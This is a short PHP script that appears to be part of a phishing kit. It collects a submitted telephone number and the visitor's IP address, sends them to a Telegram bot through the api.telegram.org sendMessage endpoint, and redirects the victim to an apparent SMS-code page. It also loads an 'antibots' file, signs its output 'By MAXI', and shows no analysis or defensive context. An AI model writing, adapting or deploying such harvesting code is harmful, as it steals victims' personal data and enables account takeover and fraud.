<?php

include "antibots.php";
include "token.php";


$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");

if(isset($_POST['sub'])){
	$message .= '

Telephone  =  '.$_POST['tel'].'

------------ '.$ip.' ------------
-------------------By MAXI  ------------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );




    header("Refresh: 0; URL=../sms.html");
    exit();
}



?>